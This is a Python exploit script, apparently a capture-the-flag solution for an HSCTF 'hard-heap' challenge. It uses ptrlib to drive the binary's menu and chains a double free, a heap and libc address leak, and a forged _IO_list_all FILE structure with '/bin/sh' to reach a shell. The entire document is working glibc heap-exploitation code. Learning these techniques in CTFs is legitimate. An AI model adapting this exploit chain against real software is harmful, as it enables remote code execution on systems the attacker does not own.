from ptrlib import *

def sice_deet(size, data):
    sock.recvuntil("> ")
    sock.sendline("1")
    sock.recvuntil("> ")
    sock.sendline(str(size))
    sock.recvuntil("> ")
    sock.send(data)

def observe_deet(index):
    sock.recvuntil("> ")
    sock.sendline("2")
    sock.recvuntil("> ")
    sock.sendline(str(index))
    return sock.recvline().rstrip()

def antisice_deet(index):
    sock.recvuntil("> ")
    sock.sendline("3")
    sock.recvuntil("> ")
    sock.sendline(str(index))

#sock = Process("./hard-heap")
libc = ELF("./libc.so.6")
sock = Socket("localhost", 9999)
#sock = Socket("pwn.hsctf.com", 5555)
main_arena = 0x3c4b20
delta = 0x58

# leak heap
fake_chunk = b"A" * 0x30
fake_chunk += p64(0)
fake_chunk += p64(0x51)
sice_deet(0x48, "0") # sice:0 (0x00)
sice_deet(0x48, fake_chunk) # sice:1 (0x50)
sice_deet(0x18, "2") # 0xa0
sice_deet(0x28, "3") # 0xc0
sice_deet(0x38, "4") # 0xf0
sice_deet(0x28, "5") # 0x130
sice_deet(0x48, "6") # 0x160
sice_deet(0x48, "7") # 0x1b0
antisice_deet(0)
antisice_deet(1)
antisice_deet(0)
addr_heap = u64(observe_deet(0)) - 0x50 # addr of sice:0
logger.info("heap = " + hex(addr_heap))
assert addr_heap > 0

# overlap & libc base
sice_deet(0x48, p64(addr_heap + 0x90)) # sice:7 = sice:0
sice_deet(0x48, "X" * 8) # sice:8
sice_deet(0x48, "AAAA") # sice:9
payload = p64(0)+p64(0x51) + p64(0)*3+p64(0xa1)
sice_deet(0x48, payload) # sice:10
antisice_deet(3)
libc_base = u64(observe_deet(3)) - main_arena - delta
logger.info("libc base = " + hex(libc_base))
addr_one_gadget = libc_base + 0x4526a

# overlap & forge _IO_list_all
fake_file = b"\x00" * 0x10
fake_file += b'/bin/sh\x00' + p64(0x61) # header of sice:3
fake_file += p64(0) # sice:3->fd
fake_file += p64(libc_base + libc.symbol("_IO_list_all") - 0x10) # sice:3->bk
fake_file += p64(0) * 2
antisice_deet(2) # the size of 2 is 0x51
sice_deet(0x48, fake_file) # sice:11 = sice:2

antisice_deet(3)
#antisice_deet(6) # unsorted bin attack
#sice_deet(0x48, p64(0) * 7 + p64(addr_heap + 0x1c0))

# prepare fake vtable
#antisice_deet(7)
#sice_deet(0x48, p64(libc_base + libc.symbol("system")) * 8)

# crash it!
sock.interactive()
